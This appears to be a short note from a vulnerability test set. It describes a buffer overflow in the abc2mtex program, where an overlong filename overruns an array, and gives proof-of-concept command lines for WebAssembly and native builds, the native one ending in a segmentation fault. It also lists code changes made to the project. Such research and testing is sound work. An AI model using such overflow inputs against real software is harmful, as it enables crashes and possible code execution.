The exploit occurs when the filename passed to abc2mtex is too large to fit in the allocated array.
It might be difficult to find this exploit by fuzzing since the fuzzer always choses the same file name.

WASM:
wasmtime abc2mtex.wasm --dir=. -- AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEDCBA

native
./abc2mtex AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEDCBA
(Segmentation fault)


CHANGES MADE TO PROJECT:
fclose commented out in close_TeX since it always results in a crash.

All gets calls changed to fgets since gets has been removed from newer C standard libraries.
